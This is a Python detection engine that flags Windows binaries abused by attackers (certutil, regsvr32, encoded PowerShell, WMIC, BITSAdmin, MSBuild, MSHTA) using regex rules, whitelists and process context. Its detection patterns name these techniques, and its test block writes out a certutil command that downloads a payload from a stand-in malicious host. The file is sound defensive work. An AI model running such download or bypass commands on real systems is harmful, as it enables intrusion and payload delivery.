import logging
import re
import json
import os
from datetime import datetime
from collections import defaultdict, deque

class EnhancedRule:
    def __init__(self, name, description, lolbin, pattern, severity=1, 
                 context_required=None, whitelist_patterns=None, required_args=None):
        """
        Initialize an enhanced detection rule
        
        Args:
            name (str): Name of the rule
            description (str): Description of the suspicious activity
            lolbin (str): Target LOLBin binary name
            pattern (str): Regex pattern to match in command line
            severity (int): Severity level (1-5, with 5 being most severe)
            context_required (list): Other processes that must be seen for this to be suspicious
            whitelist_patterns (list): Safe patterns to exclude from detection
            required_args (list): Arguments that must be present for rule to trigger
        """
        self.name = name
        self.description = description
        self.lolbin = lolbin.lower()
        self.pattern = re.compile(pattern, re.IGNORECASE)
        self.severity = severity
        self.context_required = context_required or []
        self.whitelist_patterns = []
        if whitelist_patterns:
            for pattern in whitelist_patterns:
                self.whitelist_patterns.append(re.compile(pattern, re.IGNORECASE))
        self.required_args = required_args or []

class EnhancedRuleEngine:
    def __init__(self, config_file=None):
        """Initialize the enhanced rule engine with predefined rules"""
        self.rules = []
        self.process_history = defaultdict(lambda: deque(maxlen=10))  # Stores recent processes per user
        self.whitelist = self._load_whitelist(config_file)
        self._initialize_rules()
        logging.info(f"Enhanced Rule Engine initialized with {len(self.rules)} rules")
    
    def _load_whitelist(self, config_file):
        """Load whitelist configuration"""
        whitelist = {
            "commands": [],
            "processes": [],
            "users": []
        }
        
        if config_file and os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                whitelist = config.get("whitelist", whitelist)
            except Exception as e:
                logging.error(f"Error loading whitelist: {str(e)}")
        
        return whitelist
    
    def _initialize_rules(self):
        """Create enhanced detection rules for common LOLBins techniques"""
        # Certutil misuse for downloading files
        self.rules.append(
            EnhancedRule(
                name="CertUtil Download",
                description="CertUtil used to download files from internet",
                lolbin="certutil.exe",
                pattern=r"(urlcache|-urlcache|-f|-split|-encode|-decode)",
                severity=4,
                whitelist_patterns=[
                    r"\.microsoft\.com",
                    r"\.windows\.com",
                    r"\.windowsupdate\.com",
                    r"certificate\.crt$"
                ]
            )
        )
        
        # Regsvr32 AppLocker bypass
        self.rules.append(
            EnhancedRule(
                name="Regsvr32 AppLocker Bypass",
                description="Regsvr32 used to bypass AppLocker",
                lolbin="regsvr32.exe",
                pattern=r"(/s|/u|/i:|scrobj.dll|regsvr32.*\.sct)",
                severity=5,
                required_args=["/i:"]
            )
        )
        
        # PowerShell encoded commands
        self.rules.append(
            EnhancedRule(
                name="PowerShell Encoded Command",
                description="PowerShell executing encoded commands",
                lolbin="powershell.exe",
                pattern=r"(-e|-enc|-encodedcommand)",
                severity=4,
                context_required=["cmd.exe", "wscript.exe"]
            )
        )
        
        # WMIC process call create
        self.rules.append(
            EnhancedRule(
                name="WMIC Process Creation",
                description="WMIC used to create process",
                lolbin="wmic.exe",
                pattern=r"(process call create|process.*start)",
                severity=3,
                whitelist_patterns=[
                    r"taskmgr\.exe$",
                    r"mmc\.exe$"
                ]
            )
        )
        
        # BITSAdmin file transfer
        self.rules.append(
            EnhancedRule(
                name="BITSAdmin File Transfer",
                description="BITSAdmin used for file transfer",
                lolbin="bitsadmin.exe",
                pattern=r"(transfer|create|addfile|setnotifycmdline|createandsettransferpreliminaries)",
                severity=3,
                whitelist_patterns=[
                    r"\.microsoft\.com",
                    r"\.windows\.com",
                    r"\.windowsupdate\.com"
                ]
            )
        )
        
        # MSBuild inline tasks
        self.rules.append(
            EnhancedRule(
                name="MSBuild Inline Task",
                description="MSBuild executing inline C# code",
                lolbin="msbuild.exe",
                pattern=r"(UsingTask|inline|Task.*=)",
                severity=4
            )
        )
        
        # MSHTA suspicious execution
        self.rules.append(
            EnhancedRule(
                name="MSHTA Suspicious Execution",
                description="MSHTA executing remote or encoded script",
                lolbin="mshta.exe",
                pattern=r"(javascript:|vbscript:|http:|https:)",
                severity=4
            )
        )
    
    def update_process_history(self, process_info):
        """Update the process history for context-aware detection"""
        username = process_info.get('username', 'SYSTEM')
        process_name = process_info.get('name', '').lower()
        
        if process_name:
            self.process_history[username].append(process_name)
    
    def is_whitelisted(self, process_info):
        """Check if process is whitelisted"""
        username = process_info.get('username', '')
        process_name = process_info.get('name', '').lower()
        cmdline = ' '.join(process_info.get('cmdline', []))
        
        # Check user whitelist
        if username in self.whitelist['users']:
            return True
            
        # Check process whitelist
        if process_name in self.whitelist['processes']:
            return True
            
        # Check command whitelist
        for whitelisted_cmd in self.whitelist['commands']:
            if whitelisted_cmd in cmdline:
                return True
                
        return False
    
    def analyze_process(self, process_info):
        """
        Analyze a process against enhanced detection rules
        
        Args:
            process_info (dict): Process information from process monitor
            
        Returns:
            list: List of triggered rules and their details
        """
        results = []
        process_name = process_info.get('name', '').lower()
        cmdline = ' '.join(process_info.get('cmdline', []))
        username = process_info.get('username', '')
        
        # Update process history for context detection
        self.update_process_history(process_info)
        
        # Skip analysis if process is whitelisted
        if self.is_whitelisted(process_info):
            logging.debug(f"Process whitelisted: {process_name}")
            return results
            
        # Check each rule
        for rule in self.rules:
            if process_name == rule.lolbin:
                # Check if command matches the suspicious pattern
                if rule.pattern.search(cmdline):
                    # Check for whitelist patterns
                    whitelisted = False
                    for whitelist_pattern in rule.whitelist_patterns:
                        if whitelist_pattern.search(cmdline):
                            logging.debug(f"Command matches whitelist pattern: {whitelist_pattern.pattern}")
                            whitelisted = True
                            break
                    
                    if whitelisted:
                        continue
                    
                    # Check for required arguments
                    if rule.required_args:
                        required_args_present = all(arg in cmdline for arg in rule.required_args)
                        if not required_args_present:
                            continue
                    
                    # Check for required context
                    if rule.context_required:
                        # Get the process history for this user
                        user_history = self.process_history[username]
                        context_match = any(ctx_proc in user_history for ctx_proc in rule.context_required)
                        
                        if not context_match and rule.context_required:
                            # Lower severity if context is not fully matched
                            adjusted_severity = max(1, rule.severity - 2)
                            logging.debug(f"Context not fully matched. Severity adjusted from {rule.severity} to {adjusted_severity}")
                        else:
                            adjusted_severity = rule.severity
                    else:
                        adjusted_severity = rule.severity
                    
                    # Create alert
                    alert = {
                        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'rule_name': rule.name,
                        'description': rule.description,
                        'severity': adjusted_severity,
                        'process_name': process_name,
                        'command_line': cmdline,
                        'pid': process_info.get('pid'),
                        'username': username,
                        'context': list(self.process_history[username])
                    }
                    
                    logging.warning(f"Rule triggered: {rule.name} (Severity: {adjusted_severity})")
                    results.append(alert)
        
        return results

# For testing
if __name__ == "__main__":
    # Configure logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    
    # Test the enhanced rule engine
    engine = EnhancedRuleEngine()
    
    # Test a suspicious process
    test_process = {
        'name': 'certutil.exe',
        'cmdline': ['certutil.exe', '-urlcache', '-f', 'http://malicious.com/payload.exe', 'C:\\temp\\harmless.exe'],
        'pid': 1234,
        'username': 'test_user'
    }
    
    # Update process history for context
    engine.update_process_history({'name': 'cmd.exe', 'username': 'test_user'})
    
    # Test with a whitelisted command
    whitelisted_process = {
        'name': 'certutil.exe',
        'cmdline': ['certutil.exe', '-urlcache', '-f', 'https://www.microsoft.com/download.exe', 'C:\\temp\\file.exe'],
        'pid': 1235,
        'username': 'test_user'
    }
    
    # Test analysis
    print("\nTesting suspicious process:")
    results = engine.analyze_process(test_process)
    
    if results:
        print(f"Alert: {len(results)} rules triggered!")
        for alert in results:
            print(f"Rule: {alert['rule_name']} (Severity: {alert['severity']})")
            print(f"Description: {alert['description']}")
            print(f"Command: {alert['command_line']}")
            print(f"Recent process context: {', '.join(alert['context'])}")
            print("---")
    else:
        print("No suspicious activity detected")
    
    print("\nTesting whitelisted process:")
    results = engine.analyze_process(whitelisted_process)
    
    if results:
        print(f"Alert: {len(results)} rules triggered!")
    else:
        print("No suspicious activity detected (as expected for whitelisted command)")